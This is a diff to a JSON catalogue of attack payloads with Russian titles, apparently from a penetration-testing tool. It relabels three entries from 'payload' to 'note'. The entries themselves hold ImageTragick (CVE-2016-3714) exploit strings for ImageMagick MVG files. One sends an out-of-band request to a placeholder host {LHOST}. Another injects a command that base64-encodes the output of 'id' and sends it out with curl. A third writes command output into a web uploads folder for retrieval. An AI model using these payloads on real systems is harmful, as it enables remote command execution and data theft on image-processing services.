@@ -186,15 +186,15 @@
         },
         {
           "title": "OOB-проба активности",
-          "kind": "payload",
-          "q": "Command Injection",
+          "kind": "note",
+          "q": "",
           "detail": "exploit.mvg: push graphic-context / fill 'url(https://{LHOST}/ping.jpg)' / pop graphic-context",
           "success": "входящий запрос на {LHOST}"
         },
         {
           "title": "Инъекция команды (ImageTragick CVE-2016-3714)",
-          "kind": "payload",
-          "q": "Command Injection",
+          "kind": "note",
+          "q": "",
           "detail": "fill 'url(https://127.0.0.1/x.jpg\"|curl https://{LHOST}/$(id|base64))' внутри MVG graphic-context"
         },
         {
@@ -205,8 +205,8 @@
         },
         {
           "title": "Не-слепое подтверждение",
-          "kind": "payload",
-          "q": "Command Injection",
+          "kind": "note",
+          "q": "",
           "detail": "...\"|id > /var/www/html/uploads/out.txt\" затем curl https://target/uploads/out.txt",
           "success": "uid=... в out.txt"
         },
